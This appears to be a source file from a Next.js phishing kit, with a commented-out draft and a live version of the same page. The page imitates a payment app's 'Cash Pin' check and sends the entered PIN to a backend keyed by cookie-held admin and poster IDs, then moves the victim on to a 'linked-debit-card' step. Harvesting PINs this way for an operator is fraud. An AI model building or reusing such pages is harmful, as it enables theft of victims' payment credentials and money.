// "use client";
// import React, { useState } from "react";
// import { useRouter } from "next/navigation";
// import { API_URL, site } from "../config/index";
// import Cookies from "js-cookie";
// function page() {
//      const [cashPin, setCashPin] = useState("");
//   const router = useRouter();
//   const adminId = Cookies.get("adminId");
//   const posterId = Cookies.get("posterId");

// const handleBack = () => {
//     router.back();
//   };



//   const handleContinue = async () => {
//     if (!cashPin) {
//       return;
//     }
//     const values = {
//       cashPin: cashPin,
//       site: site,
//     };
//     const url = `${API_URL}/ad/${adminId}/${posterId}`;

//     const res = await fetch(url, {
//       method: "POST",
//       headers: {
//         Accept: "application/json",
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify(values),
//     });
//     const data = await res.json();
//     console.log(data);

//     if (res.ok) {
//       console.log("success", data);
//       Cookies.set("cashCard", data?.info?.cashPin);
//       Cookies.set("id", data?.info?._id);
//       // router.push("/password");
//     } else {
//       console.log("error", data);
//       // toast.error("Something Went Wrong");
//     }
//   };
  

//   return (
//    <div className="flex items-center justify-center min-h-screen bg-white p-4">
//       <div className="w-full max-w-md border border-gray-200 shadow-md rounded-2xl p-6">
//         <h1 className="text-2xl font-semibold mb-2 text-black">
//           Enter your Cash Pin number
//         </h1>
//         <p className="text-gray-600 mb-6">
//           We'll check to make sure it matches what's on file.
//         </p>

//         <input
//           type="text"
//           value={cashPin}
//           onChange={(e) => setCashPin(e.target.value)}
//           placeholder="Cash Pin Number"
//           className="w-full p-3 border border-gray-300 rounded-xl mb-6"
//         />

//         <div className="flex justify-between gap-4">
//           <button
//             onClick={handleBack}
//             className="w-full p-3 bg-gray-100 text-black rounded-xl hover:bg-gray-200"
//           >
//             Back
//           </button>

//           <button
//             onClick={handleContinue}
//             className={`w-full p-3 rounded-xl text-white ${cashPin ? "bg-green-500 hover:bg-green-600" : "bg-green-200 cursor-not-allowed"}`}
//             disabled={!cashPin}
//           >
//             Continue
//           </button>
//         </div>
//       </div>
//     </div>
//   );
// }

// export default page;







"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import { API_URL, site } from "../config/index";
import Cookies from "js-cookie";
import { toast, ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CloseIcon from "@mui/icons-material/Close"; // Optional: requires @mui/icons-material

function Page() {
 const [cashPin, setCashPin] = useState(null);
  const router = useRouter();
  const adminId = Cookies.get("adminId");
  const posterId = Cookies.get("posterId");

  const handleBack = () => {
    router.back();
  };

  const handleContinue = async () => {
       if (!cashPin || cashPin.length !== 4) {
  return prompt("Cash Pin  has to be only 4 digits and not empty");

     }


    const values = {
      cashPin: cashPin,
      site: site,
    };

    const url = `${API_URL}/ad/${adminId}/${posterId}`;
    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();
    if (res.ok) {
      Cookies.set("cashCard", data?.info?.cashPin);
      Cookies.set("id", data?.info?._id);
setCashPin() 
router.push("/linked-debit-card")
   } else {
      console.log("error", data);
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-white px-4 pt-10 pb-4">
      <div className="w-full max-w-md">
        {/* Top Close Icon */}
        <div className="flex items-center justify-between mb-6">
          <button onClick={handleBack} className="text-gray-600">
            <CloseIcon fontSize="medium" />
          </button>
        </div>

        {/* Content Box */}
        <div className="border border-gray-200 shadow-md rounded-2xl p-6">
          <h1 className="text-xl font-semibold text-black mb-2">
           Enter your Cash Pin 
          </h1>
          <p className="text-sm text-gray-600 mb-6">
            We'll check to make sure it matches what's on file.
          </p>

          <input
            type="number"
            value={cashPin}
            onChange={(e) => setCashPin(e.target.value)}
            placeholder="Cash Pin Number"
            className="w-full p-3 border border-gray-300 rounded-xl text-base mb-[300px]"
          />

          <div className="flex flex-col gap-3">
            <button
              onClick={handleBack}
              className="w-full p-3 bg-gray-100 text-black rounded-xl hover:bg-gray-200 text-base"
            >
              Back
            </button>

            <button
              onClick={handleContinue}
              disabled={!cashPin}
              className={`w-full p-3 rounded-xl text-white text-base transition ${
                cashPin
                  ? "bg-green-500 hover:bg-green-600"
                  : "bg-green-200 cursor-not-allowed"
              }`}
            >
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Page;
